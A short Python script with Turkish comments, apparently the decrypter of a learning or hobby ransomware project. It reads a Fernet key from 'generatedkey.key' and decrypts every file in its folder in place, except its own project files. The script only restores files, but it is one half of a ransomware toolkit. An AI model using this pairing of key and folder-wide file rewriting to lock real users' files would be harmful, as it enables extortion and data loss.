import os
from cryptography.fernet import Fernet #fernet şifreleme algoritması


file_list=[]
for i in os.listdir():               #bu fonksiyon kodun bulunduğu klasördeki tüm dosyaları gösteriyor.
    if i == "ransom.py" or i == "generatedkey.key" or i == "ransomdecrypter.py":   #kodların şifrenin yazılı olduğu doyayı şifrelemememiz lazım
        continue
    if os.path.isfile(i):      #içine yazılan şeyin dosya mı falan olduğuna bakıyor dosya ise şart sağlanıyor klasörleri şifrelemicez
        file_list.append(i)


with open("generatedkey.key","rb") as generatedkey:
    secret_key = generatedkey.read()
#yukarıda keyin yazdılı olduğu dosyayı okuduk


for t in file_list:
    with open(t,"rb") as file:  #dosyayı açtık okuduk
        contents = file.read()
    contents_decrypted = Fernet(secret_key).decrypt(contents) #neyi neye göre çözeceğini soruyor
    with open(t,"wb") as file:   #dosyayı tekrar açtık
        file.write(contents_decrypted)  #
